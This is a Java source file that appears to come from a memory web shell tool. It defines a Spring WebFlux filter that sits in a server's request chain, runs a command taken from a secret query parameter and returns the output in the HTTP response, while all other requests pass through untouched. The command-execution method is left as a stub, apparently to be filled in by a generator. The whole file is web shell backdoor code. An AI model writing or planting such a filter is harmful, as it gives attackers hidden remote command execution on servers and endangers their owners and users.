package com.reajason.javaweb.memshell.shelltool.command;

import org.springframework.core.io.buffer.DataBuffer;
import org.springframework.core.io.buffer.DefaultDataBufferFactory;
import org.springframework.web.server.ServerWebExchange;
import org.springframework.web.server.WebFilter;
import org.springframework.web.server.WebFilterChain;
import reactor.core.publisher.Mono;

import java.io.BufferedReader;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.nio.charset.StandardCharsets;

/**
 * @author ReaJason
 * @since 2024/12/25
 */
public class CommandWebFilter implements WebFilter {
    public static String paramName;

    @Override
    public Mono<Void> filter(ServerWebExchange exchange, WebFilterChain chain) {
        String param = getParam(exchange.getRequest().getQueryParams().getFirst(paramName));
        if (param == null) {
            return chain.filter(exchange);
        }
        return exchange.getResponse().writeWith(getResult(param));
    }

    private Mono<DataBuffer> getResult(String param) {
        StringBuilder result = new StringBuilder();
        try {
            InputStream inputStream = getInputStream(param);
            try (BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(inputStream))) {
                String line;
                while ((line = bufferedReader.readLine()) != null) {
                    result.append(line);
                    result.append(System.lineSeparator());
                }
            }
        } catch (Throwable e) {
            e.printStackTrace();
        }
        return Mono.just(new DefaultDataBufferFactory().wrap(result.toString().getBytes(StandardCharsets.UTF_8)));
    }

    private String getParam(String param) {
        return param;
    }

    private InputStream getInputStream(String param) throws Exception {
        return null;
    }
}
